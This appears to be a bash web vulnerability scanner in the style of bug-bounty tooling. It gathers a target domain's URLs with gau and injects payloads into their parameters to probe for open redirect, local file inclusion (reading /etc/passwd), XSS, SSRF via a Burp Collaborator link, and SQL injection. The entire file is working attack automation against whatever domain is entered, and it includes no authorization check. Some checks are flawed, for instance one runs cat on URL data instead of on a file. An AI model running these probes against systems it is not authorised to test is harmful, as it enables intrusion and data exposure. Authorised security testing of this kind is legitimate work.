#!/bin/bash

# Function for Redirect URL Testing
redirect_testing() {
    echo "Starting Redirect URLs testing..."
    read -p "Enter the replacement URL: " replacement_url
    redirected_urls=$(echo "$gau_output" | gf redirect | qsreplace "$replacement_url")
    echo "$redirected_urls" > "${domain_name}_redirected_urls.txt"
    echo "Redirected URLs saved to ${domain_name}_redirected_urls.txt"
}

# Function for LFI Testing
lfi_testing() {
    echo "Starting LFI testing..."
    cat "$output_file" | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
}

# Function for XSS Testing
xss_testing() {
    echo "Starting XSS testing..."
    read -p "Enter the XSS payload: " xss_payload
    cat "$output_file" | grep '=' | qsreplace "$xss_payload" | while read host; do
        curl -s --path-as-is --insecure "$host" | grep -qs "$xss_payload" && echo "$host \033[0;31m" Vulnerable
    done
}

# Function for SSRF Testing
ssrf_testing() {
    echo "Starting SSRF testing..."
    read -p "Enter the Burp Collaborator link: " burp_collab_link
    echo "$gau_output" | grep "=" | qsreplace "$burp_collab_link" >> "${domain_name}_ssrf.txt"
    ffuf -c -w "${domain_name}_ssrf.txt" -u FUZZ
}

# Function for SQL Testing
sql_test(){
    echo "Starting SQL testing..."
    cat "$gau_output" | grep '=' | qsreplace '"' | while read host; do
        curl -s --path-as-is --insecure "$host" | grep -qs '"' && echo "$host \033[0;31m" Vulnerable
    done
}

# Function to run all vulnerability tests
run_all_tests() {
    redirect_testing
    lfi_testing
    xss_testing
    ssrf_testing
    sql_test
}

# Ask the user for the domain name
read -p "Enter the domain name: " domain_name

# Fetch URLs related to the specified domain using gau
gau_output=$(gau "$domain_name")

# Define the output file name with the domain name and 'gau' indicator
output_file="${domain_name}_gau.txt"

# Save the fetched URLs to the output file
echo "$gau_output" > "$output_file"
echo "URLs saved to $output_file"

# Main Menu
while true; do
    echo "Select vulnerability testing:"
    echo "1. Redirect URL Testing"
    echo "2. LFI Testing"
    echo "3. XSS Testing"
    echo "4. SSRF Testing"
    echo "5. SQL Testing"
    echo "6. Run All Tests"
    echo "7. Main Menu"
    echo "8. Exit"
    read -p "Enter your choice: " choice
    case $choice in
        1) redirect_testing;;
        2) lfi_testing;;
        3) xss_testing;;
        4) ssrf_testing;;
        5) sql_test;;
        6) run_all_tests;;
        7) 
            bash Main.sh
            break ;;
        8) echo "Exiting..."; exit;;
        *) echo "Invalid choice. Please enter a number between 1 and 8.";;
    esac
done
